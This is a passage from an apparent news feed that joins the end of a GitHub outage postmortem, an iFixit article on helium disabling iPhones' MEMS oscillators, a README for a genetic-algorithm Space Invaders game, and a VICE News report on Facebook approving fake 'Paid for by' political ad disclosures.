&lt;p&gt;During our recovery, we captured the MySQL binary logs containing the writes we took in our primary site that were not replicated to our West Coast site from each affected cluster. The total number of writes that were not replicated to the West Coast was relatively small. For example, one of our busiest clusters had 954 writes in the affected window. We are currently performing an analysis on these logs and determining which writes can be automatically reconciled and which will require outreach to users. We have multiple teams engaged in this effort, and our analysis has already determined a category of writes that have since been repeated by the user and successfully persisted. As stated in this analysis, our primary goal is preserving the integrity and accuracy of the data you store on GitHub.&lt;/p&gt;
&lt;h3 id=&quot;communication&quot;&gt;Communication&lt;/h3&gt;
&lt;p&gt;In our desire to communicate meaningful information to you during the incident, we made several public estimates on time to repair based on the rate of processing of the backlog of data. In retrospect, our estimates did not factor in all variables. We are sorry for the confusion this caused and will strive to provide more accurate information in the future.&lt;/p&gt;
&lt;h3 id=&quot;technical-initiatives&quot;&gt;Technical initiatives&lt;/h3&gt;
&lt;p&gt;There are a number of technical initiatives that have been identified during this analysis. As we continue to work through an extensive post-incident analysis process internally, we expect to identify even more work that needs to happen.&lt;/p&gt;
&lt;ol readability=&quot;11.5&quot;&gt;&lt;li readability=&quot;4&quot;&gt;
&lt;p&gt;Adjust the configuration of Orchestrator to prevent the promotion of database primaries across regional boundaries. Orchestrator’s actions behaved as configured, despite our application tier being unable to support this topology change. Leader-election within a region is generally safe, but the sudden introduction of cross-country latency was a major contributing factor during this incident. This was emergent behavior of the system given that we hadn’t previously seen an internal network partition of this magnitude.&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;6&quot;&gt;
&lt;p&gt;We have accelerated our migration to a new status reporting mechanism that will provide a richer forum for us to talk about active incidents in crisper and clearer language. While many portions of GitHub were available throughout the incident, we were only able to set our status to green, yellow, and red. We recognize that this doesn’t give you an accurate picture of what is working and what is not, and in the future will be displaying the different components of the platform so you know the status of each service.&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;4&quot;&gt;
&lt;p&gt;In the weeks prior to this incident, we had started a company-wide engineering initiative to support serving GitHub traffic from multiple data centers in an active/active/active design. This project has the goal of supporting N+1 redundancy at the facility level. The goal of that work is to tolerate the full failure of a single data center failure without user impact. This is a major effort and will take some time, but we believe that multiple well-connected sites in a geography provides a good set of trade-offs. This incident has added urgency to the initiative.&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;3&quot;&gt;
&lt;p&gt;We will take a more proactive stance in testing our assumptions. GitHub is a fast growing company and has built up its fair share of complexity over the last decade. As we continue to grow, it becomes increasingly difficult to capture and transfer the historical context of trade-offs and decisions made to newer generations of Hubbers.&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;&lt;h3 id=&quot;organizational-initiatives&quot;&gt;Organizational initiatives&lt;/h3&gt;
&lt;p&gt;This incident has led to a shift in our mindset around site reliability. We have learned that tighter operational controls or improved response times are insufficient safeguards for site reliability within a system of services as complicated as ours. To bolster those efforts, we will also begin a systemic practice of validating failure scenarios before they have a chance to affect you. This work will involve future investment in fault injection and chaos engineering tooling at GitHub.&lt;/p&gt;
&lt;h2 id=&quot;conclusion&quot;&gt;Conclusion&lt;/h2&gt;
&lt;p&gt;We know how much you rely on GitHub for your projects and businesses to succeed. No one is more passionate about the availability of our services and the correctness of your data. We will continue to analyze this event for opportunities to serve you better and earn the trust you place in us.&lt;/p&gt;

<title>iPhones are allergic to helium</title>
<link>https://ifixit.org/blog/11986/iphones-are-allergic-to-helium/</link>
<guid isPermaLink="true" >https://ifixit.org/blog/11986/iphones-are-allergic-to-helium/</guid>
<description>&lt;p&gt;&lt;span&gt;This is the kind of tale that you don’t hear every day.  Erik Wooldridge&lt;/span&gt;&lt;span&gt; is a Systems Specialist at Morris Hospital near Chicago. During the installation of a new GE Healthcare MRI machine, he&lt;/span&gt; &lt;a href=&quot;https://www.reddit.com/r/sysadmin/comments/9si6r9/postmortem_mri_disables_every_ios_device_in/&quot;&gt;&lt;span&gt;started getting calls&lt;/span&gt;&lt;/a&gt; &lt;span&gt;that cell phones weren’t working. Then, some Apple Watches started glitching.&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;“My immediate thought was that the MRI must have emitted some sort of EMP, in which case we could be in a lot of trouble.” But an&lt;/span&gt; &lt;a href=&quot;https://en.wikipedia.org/wiki/Electromagnetic_pulse&quot;&gt;&lt;span&gt;electromagnetic pulse&lt;/span&gt;&lt;/a&gt; &lt;span&gt;would have taken out medical equipment in the facility as well, and they were working fine! He started investigating, and learned that every single impacted device was made by Apple—the technician’s Android phones were fine. And it was a wide-sweeping issue, impacting 40 different devices. What the heck?&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;I’ve seen a lot of strange glitches in my time, and I’ve never heard of something like this. Neither had Erik. “The behavior of the devices was pretty odd. Most of them were completely dead. I plugged them in to the wall and had no indication that the device was charging. The other devices that were powering on seemed to have issues with the cellular radio. The wifi connection was consistent and fast, but cellular was very hit or miss.”&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;That’s when he posted the issue to Reddit, where other sysadmins speculated that it might be caused by the liquid helium used to cool the MRI machine. So he investigated, and found there was a helium leak at the same time that vented into the building.&lt;/span&gt;&lt;/p&gt;
&lt;div class=&quot;wp-caption alignnone&quot; readability=&quot;7&quot;&gt;&lt;img src=&quot;https://d3nevzfk7ii3be.cloudfront.net/igi/qN5wNVtZXySaAFRG.large&quot; alt=&quot;&quot; width=&quot;800&quot; height=&quot;534&quot;/&gt;&lt;p class=&quot;wp-caption-text&quot;&gt;Morris Hospital’s GE Medical BrightSpeed CT Machine&lt;/p&gt;
&lt;/div&gt;
&lt;p&gt;&lt;span&gt;“I discovered that the helium leakage occurred while the new magnet was being ramped [down to cool it]. Approximately 120 liters of liquid [helium] were vented over the course of 5 hours. There was a vent in place that was functioning, but there must have been a leak. The MRI room is not on an isolated HVAC loop, so it shares air with most or all of the facility. We do not know how much of the 120 liters ended up going outdoors and how much ended up inside. Helium expands about 750 times when it expands from a liquid to a gas, so that’s a lot of helium (90,000 L of gaseous He).” I bet the nurse’s voices were higher pitched that day!&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;The devices started to slowly recover after the initial incident, but not completely. “We did have a few abnormal devices. One iPhone had severe service issues after the incident, and some of the [Apple Watches] remained on, but the touch screens weren’t working (even after several days.)”&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;He performed some triage, categorizing devices by type. “Models of iPhones and Apple Watches afflicted were iPhone 6 and higher, and Apple Watch Series 0 and higher. There was only one iPhone 5 in the building that we know of and it was not impacted in any way. The question at the time was: What occurred that would only cause Apple devices to stop working?”&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;This piqued my interest, and I reached out to some friends that make ‘MEMS’ silicon. These&lt;/span&gt; &lt;a href=&quot;https://en.wikipedia.org/wiki/Microelectromechanical_systems&quot;&gt;&lt;span&gt;microelectromechanical systems&lt;/span&gt;&lt;/a&gt; &lt;span&gt;are some of the smallest mechanical apparatuses in the world. Every phone has gyroscopes and accelerometers with micrometer-thin elements. My initial theory, shared by some on Reddit, was that the helium molecules were small enough to get inside these chips and interfere with the mechanical workings.&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;But there are two problems with this idea: One, Apple isn’t alone in using MEMS gyroscopes—every phone has them. Why weren’t the Android phones affected? Perhaps there’s a bug in iOS that causes crashes when it gets faulty data from the gyro? But the bug impacted Apple Watches, too—and they run WatchOS. Additionally, iPhones earlier than the 6 weren’t affected. It seems unlikely that this was a new software bug that impacted both iOS and WatchOS.&lt;/span&gt;&lt;/p&gt;

&lt;p&gt;&lt;span&gt;So what else could it be? Well, at the heart of every electronic device is a clock. Traditionally, these are quartz oscillators, crystals that vibrate at a specific predictable frequency—generally 32 kHz. When they were first invented, they enabled the first digital ‘quartz’ watches. Now, these frequency generators are at the heart of every electronic device.&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;Without a clock, the system stands still. The CPU flat out doesn’t work. The clock is literally the heartbeat of a modern device.&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;But quartz oscillators have some problems. They don’t keep time as well at high (and low) temperatures, and they’re a relatively large component—1×3 mm or so. In their quest for smaller and smaller hardware, Apple has recently started using MEMS timing oscillators from a specialized company called SiTime to replace quartz components.&lt;/span&gt;&lt;/p&gt;
&lt;div class=&quot;wp-caption alignnone&quot; readability=&quot;7&quot;&gt;&lt;img class=&quot;size-medium&quot; src=&quot;https://d3nevzfk7ii3be.cloudfront.net/igi/AOFFOoVkpbuQLBZB.large&quot; width=&quot;800&quot; height=&quot;600&quot;/&gt;&lt;p class=&quot;wp-caption-text&quot;&gt;A MEMS accelerometer under an electron microscope at 50 micrometer resolution.&lt;/p&gt;
&lt;/div&gt;
&lt;p&gt;&lt;span&gt;Specifically, they’re using the&lt;/span&gt; &lt;a href=&quot;https://www.sitime.com/products/32-khz-oscillators/sit1532&quot;&gt;&lt;span&gt;SiT512&lt;/span&gt;&lt;/a&gt;&lt;span&gt;, ‘the world’s smallest, lowest power 32 kHz oscillator.’ And if the MEMS device was susceptible to helium intrusion, that could be our culprit!&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;A failing oscillator would match&lt;/span&gt; &lt;a href=&quot;https://www.reddit.com/r/sysadmin/comments/9mk2o7/mri_disabled_every_ios_device_in_facility/&quot;&gt;&lt;span&gt;Erik’s symptoms&lt;/span&gt;&lt;/a&gt;&lt;span&gt;, which he reproduced in an &lt;a href=&quot;https://www.youtube.com/watch?v=5Cvdyt-KZHk&amp;amp;feature=youtu.be&quot;&gt;experiment&lt;/a&gt;. “I placed an iPhone 8 Plus in a sealed bag and filled it with helium. This wasn’t incredibly realistic, as the original iPhones would have been exposed to a much lower concentration, but it still supports the idea that helium can disable the device. In the video I leave the display on and running a stopwatch for the duration of the test. Around 8 minutes and 20 seconds in the phone locks up. Nothing crazy really happens. The clock just stops, and nothing else. The display did stay on though.”&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;I was able to repeat his experiment in our lab. My iPhone 8 lasted about four minutes in a helium atmosphere before it shut off entirely.&lt;/p&gt;
&lt;p&gt;&lt;span&gt;Sure enough, Apple’s&lt;/span&gt; &lt;a href=&quot;https://help.apple.com/iphone/12/#/iph301fc905&quot;&gt;&lt;span&gt;user guide&lt;/span&gt;&lt;/a&gt; &lt;span&gt;for the iPhone and Apple watch admits this is a problem:&lt;/span&gt;&lt;/p&gt;
&lt;blockquote readability=&quot;13&quot;&gt;
&lt;p&gt;&lt;span&gt;“Exposing iPhone to environments having high concentrations of industrial chemicals,&lt;/span&gt; &lt;strong&gt;including near evaporating liquified gasses such as helium&lt;/strong&gt;&lt;span&gt;, may damage or impair iPhone functionality. … If your device has been affected and shows signs of not powering on, the device can typically be recovered.  Leave the unit unconnected from a charging cable and let it air out for approximately one week. The helium must fully dissipate from the device, and the device battery should fully discharge in the process.  &lt;/span&gt;&lt;strong&gt;After a week&lt;/strong&gt;&lt;span&gt;, plug your device directly into a power adapter and let it charge for up to one hour.  Then the device can be turned on again.” (Emphasis added.)&lt;/span&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;span&gt;Hydrogen and helium are notoriously hard to contain because their molecules are so small. It sounds like this is a problem that SiTime has been working to solve for a while. I found this on &lt;a href=&quot;https://www.sitime.com/support/faqs&quot;&gt;their FAQ&lt;/a&gt;, “How effective is the hermetic seal of MEMS oscillators?”&lt;/span&gt;&lt;/p&gt;
&lt;blockquote readability=&quot;10&quot;&gt;
&lt;p&gt;&lt;span&gt;“&lt;/span&gt;&lt;strong&gt;Previous generations of EpiSeal resonators may have been impacted by large concentrations of small-molecule gas.&lt;/strong&gt; &lt;span&gt;Newer EpiSeal resonators are impervious to all small-molecule gases. Please contact SiTime in case you are planning to use a SiTime device in large concentrations of small-molecule gas, so that we can recommend an appropriate, immune part.” (Emphasis added again.)&lt;/span&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;span&gt;I was curious if this would impact other kinds of MEMS devices, so I reached out to InvenSense Motion, the company who makes the image stabilizing chip in the&lt;/span&gt; &lt;a href=&quot;https://www.ifixit.com/Teardown/Google+Pixel+3+Teardown/113763&quot;&gt;&lt;span&gt;Pixel 3&lt;/span&gt;&lt;/a&gt;&lt;span&gt;. David Almoslino, their Senior Director of Corporate Marketing, confirmed that it was an issue. He told me that their products “can be somewhat susceptible to helium. Helium can diffuse through the fusion bond oxide and cause the cavity pressure to increase. In our pressure sensors, helium could cause the absolute accuracy to temporarily degrade. In our gyro sensors, helium could cause the offset to drift and could cause the oscillation to temporarily stop. In any [accelerometer] sensors, helium should have very little impact. All our InvenSense parts should recover once removed from any helium environment.”&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;Of course, the reason that you’ve never heard of this before is because it’s such a rare situation. But silicon manufacturers are aware of it and do what they can to minimize the problem. David told me that “A helium leak test is a pretty standard MEMS test done by most companies to assess vacuum packages.”&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;So that’s it! Like an incredibly&lt;/span&gt; &lt;a href=&quot;https://ifixit.org/blog/10229/macbook-pro-keyboard/&quot;&gt;&lt;span&gt;tiny grain of sand&lt;/span&gt;&lt;/a&gt;&lt;span&gt;, the helium molecules are small enough to get inside the device, physically stop the clock, and turn your phone temporarily into a paperweight.&lt;/span&gt;&lt;/p&gt;

<title>Show HN: Space invaders, but the invaders evolve with genetic algorithm</title>
<link>https://github.com/victorqribeiro/invaderz</link>
<guid isPermaLink="true" >https://github.com/victorqribeiro/invaderz</guid>
<description>&lt;div class=&quot;Box-body p-6&quot;&gt;
&lt;article class=&quot;markdown-body entry-content&quot; itemprop=&quot;text&quot;&gt;
&lt;p&gt;A game kinda like space invaders, but the invaders evolve with &lt;a href=&quot;https://en.wikipedia.org/wiki/Genetic_algorithm&quot; rel=&quot;nofollow&quot;&gt;genetic algorithm&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;&lt;a target=&quot;_blank&quot; rel=&quot;noopener noreferrer&quot; href=&quot;https://github.com/victorqribeiro/invaderz/blob/master/screenshot.png&quot;&gt;&lt;img src=&quot;https://github.com/victorqribeiro/invaderz/raw/master/screenshot.png&quot; alt=&quot;InvaderZ&quot;/&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;If you want to see a live version of it, it's hosted &lt;a href=&quot;https://victorribeiro.com/invaderz&quot; rel=&quot;nofollow&quot;&gt;here&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;You can also add it as an app to your phone (menu / add to home screen), if you wish so.&lt;/p&gt;
&lt;h2&gt;How to Play&lt;/h2&gt;
&lt;p&gt;Left and Right arrow keys move the cannon, space bar shoots; or, if you are on your phone, just use the buttons&lt;/p&gt;
&lt;h2&gt;About&lt;/h2&gt;
&lt;p&gt;You are the last hope of the human kind as the defense against the InvaderZ. They are deployed by their mothership with the sole purpose of entering earth's atmosphere. Although they are not a danger for you as an individual, if 5 of them gets through, everything is doomed. You can only shoot one projectile at the time, so be mindful, as you are not getting another shot until the last fired projectile disperse into the space or hits a target. Each InvaderZ has a shape that influence how they move. When a InvaderZ dies, they upload their progress to the mothership, so it can generate more InvaderZ like the ones who did well before. After each 7 generations of InvaderZ, the mothership generates a complete new wave of InvaderZ keeping only the very best of the last past 7 generations.&lt;/p&gt;
&lt;h2&gt;Genetic Algorithm&lt;/h2&gt;
&lt;p&gt;A random population of InvaderZ are generated at the beginning of the game.&lt;/p&gt;
&lt;p&gt;The fit score of the InvaderZ is how far it made through the earth's atmosphere.&lt;/p&gt;
&lt;p&gt;The way they move are directly related to their body shape.&lt;/p&gt;
&lt;p&gt;After they die, a new wave of InvaderZ are created by crossing over the InvaderZ with the higher fit score.&lt;/p&gt;
&lt;p&gt;The cross over could happen of 6 different forms:&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;First horizontal half of the first parent with the second horizontal half of the second parent.&lt;/li&gt;
&lt;li&gt;First horizontal half of the second parent with the second horizontal half of the first parent.&lt;/li&gt;
&lt;li&gt;First vertical half of the first parent with the second vertical half of the second parent.&lt;/li&gt;
&lt;li&gt;First vertical half of the second parent with the second vertical half of the first parent.&lt;/li&gt;
&lt;li&gt;Odd genes from the first parent, even genes from the second parent.&lt;/li&gt;
&lt;li&gt;Even genes from the first parent, odd genes from the second parent.&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;There's a 10% chance of mutation after each cross over, altering their body shape and so the way they move.&lt;/p&gt;
&lt;p&gt;To keep things interesting, after 7 generations, a new wave is created from scratch and only the best of the 7 past generations is keep.&lt;/p&gt;

<title>We posed as 100 Senators to run ads on Facebook. Facebook approved all of them</title>

<guid isPermaLink="true" >https://news.vice.com/en_us/article/xw9n3q/we-posed-as-100-senators-to-run-ads-on-facebook-facebook-approved-all-of-them</guid>
<description>&lt;div readability=&quot;53.227602905569&quot;&gt;

&lt;p&gt;One of Facebook’s major efforts to add transparency to political advertisements is a required “Paid for by” disclosure at the top of each ad supposedly telling users who is paying for political ads that show up in their news feeds.&lt;/p&gt;
&lt;p&gt;But on the eve of the 2018 midterm elections, a VICE News investigation found the “Paid for by” feature is easily manipulated and appears to allow anyone to lie about who is paying for a political ad, or to pose as someone paying for the ad.&lt;/p&gt;


&lt;p&gt;To test it, VICE News applied to buy fake ads on behalf of all 100 sitting U.S. senators, including ads “Paid for by” by Mitch McConnell and Chuck Schumer. Facebook’s approvals were bipartisan: All 100 sailed through the system, indicating that just about anyone can buy an ad identified as “Paid for by” by a major U.S. politician.&lt;/p&gt;
&lt;p&gt;What’s more, all of these approvals were granted to be shared from pages for fake political groups such as “Cookies for Political Transparency” and “Ninja Turtles PAC.” VICE News did not buy any Facebook ads as part of the test; rather, we received approval to include &quot;Paid for by&quot; disclosures for potential ads.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Read: &lt;em&gt;&lt;a href=&quot;https://news.vice.com/en_us/article/wj9mny/facebooks-political-ad-tool-let-us-buy-ads-paid-for-by-mike-pence-and-isis&quot; target=&quot;_blank&quot;&gt;Facebook's &quot;Paid for by&quot; ad tool allowed us to buy ads for &quot;Mike Pence&quot; and &quot;ISIS&quot;&lt;/a&gt;&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;

&lt;/div&gt;&lt;div readability=&quot;140&quot;&gt;
&lt;p&gt;One of Facebook’s major efforts to add transparency to political advertisements is a required “Paid for by” disclosure at the top of each ad supposedly telling users who is paying for political ads that show up in their news feeds.&lt;/p&gt;

&lt;p&gt;Read: Facebook's &quot;Paid for by&quot; ad tool allowed us to buy ads for &quot;Mike Pence&quot; and &quot;ISIS&quot;&lt;/p&gt;
&lt;p&gt;This comes after a VICE News test conducted last week, where we received approval to run political ads posing as Vice President Mike Pence, Democratic National Committee Chairman Tom Perez, and the Islamic State group. An attempt to place an ad posing as Hillary Clinton was denied. At the time, Facebook said those ad disclosures should not have been approved.&lt;/p&gt;
&lt;p&gt;But these tests show that compliance with the feature is entirely voluntary, meaning a tool that Facebook introduced to increase trust in advertising can also be used as a vector for misinformation, and another way bad actors can game Facebook’s platform.&lt;/p&gt;
&lt;p class=&quot;article__pull-quote&quot;&gt;“If Facebook is going to claim to verify who’s paying for political ads, they need to actually do the work”&lt;/p&gt;
&lt;p&gt;“If Facebook is going to claim to verify who’s paying for political ads, they need to actually do the work,” said Sen. Ron Wyden, Democrat of Oregon, in a statement to VICE News. “Clearly it needs to do far more to combat fraudulent and false content, both in paid advertisements and viral posts.”&lt;/p&gt;
&lt;p&gt;Facebook confirmed that the 100 &quot;Paid for by&quot; disclosures in the names of U.S. senators should never have been approved. But the company argues that its &quot;Paid for by&quot; feature has brought a new level of transparency to political advertising, and cautioned it's just one piece of its efforts, along with a searchable Ad Archive.&lt;/p&gt;
&lt;p&gt;&quot;We know we can’t do this alone, and by housing these ads for up to seven years, people, regulators, third parties and watchdog groups can hold these groups more accountable,&quot; said Facebook Director of Product Management Rob Leathern in a statement.&lt;/p&gt;
&lt;p&gt;Facebook rolled out the “Paid for by” tool in May “to help prevent abuse, especially during elections.” Leathern underscored its importance. “This will help ensure that you can see who is paying for the ad,” he wrote at the time. “Which is especially important when the Page name doesn’t match the name of the company or person funding the ad.”&lt;/p&gt;
&lt;p&gt;His colleague echoed that a few days ago. “When it comes to advertising on Facebook, people should be able to tell who the advertiser is and see the ads they’re running, especially for political ads,” Facebook Vice President of Ads Rob Goldman wrote on Oct. 27.&lt;/p&gt;
&lt;p&gt;In announcing new transparency efforts or tools to combat foreign influence, Facebook included a caveat. “These changes will not prevent abuse entirely. We’re up against smart, creative and well-funded adversaries who change their tactics as we spot abuse,” Leathern wrote. But we believe that they will help prevent future interference in elections on Facebook. And it is why they are so important.”&lt;/p&gt;
&lt;p&gt;But posing as 100 senators didn’t require being smart, creative, or even particularly well-funded. Receiving approval to run an ad “paid for” by a senator typically just took a few minutes. We used 10 fake Facebook pages with no content, and changed the “paid for” disclosure after each senator was approved.&lt;/p&gt;
&lt;p&gt;Read: No one is tracking illegal political ads in your Facebook feed&lt;/p&gt;
&lt;p&gt;In order to run a “Paid for by” disclosure on Facebook, you must first submit the name to the company for approval, along with an image of a valid driver’s license and the last four digits of your Social Security number.&lt;/p&gt;
&lt;p&gt;Facebook has embarked on an aggressive advertising campaign to show off its new political transparency tools, including “Paid for by” disclosures.&lt;/p&gt;
&lt;p&gt;“As long as I can remember, every radio ad, every TV ad that touched politics always ended with a disclaimer. ‘Paid for by, brought to you by,’’ Sarah Clark Schiff, product manager, Business Integrity said in a video released last week. “And there was never anything that was systematic that delivered the same kind of visibility into who paid for paid political content on Facebook, until today.”&lt;/p&gt;
&lt;p&gt;There was one “Paid for” disclosure that Facebook didn’t approve in our latest test. They denied, just a couple minutes after we submitted it: Mark Zuckerberg.&lt;/p&gt;
